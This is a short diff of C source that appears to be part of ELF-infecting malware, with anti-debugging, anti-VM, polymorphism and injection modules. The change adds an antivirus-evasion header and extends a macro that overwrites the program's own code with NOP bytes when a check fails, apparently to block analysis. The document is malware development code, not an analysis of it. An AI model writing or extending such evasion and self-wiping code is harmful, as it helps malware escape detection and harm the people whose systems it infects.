@@ -18,6 +18,7 @@
 
 #include "antidebug.h"
 #include "antivm.h"
+#include "antiav.h"
 #include "poly.h"
 #include "elf_inject.h"
 
@@ -30,7 +31,7 @@ do {                                    \
         error_handler();                \
     } else {                            \
         int i = 0;                      \
-        char *start = (char *)&_init;   \
+        char *start = (char *)&__executable_start;   \
         char *end = (char *)&__etext;   \
         while (start != end) {          \
             *((int *)start + i) = 0x90; \
@@ -48,8 +49,8 @@ int create_persistent_time_storage(char *);
 int rewrite_create_persistent_time_storage(char *, int);
 int read_persistent_time_storage();
 
-extern unsigned char *_init;
 extern unsigned char *_start;
+extern unsigned char *__executable_start;
 extern unsigned char *__etext;
 
 extern void (*error_handler)();
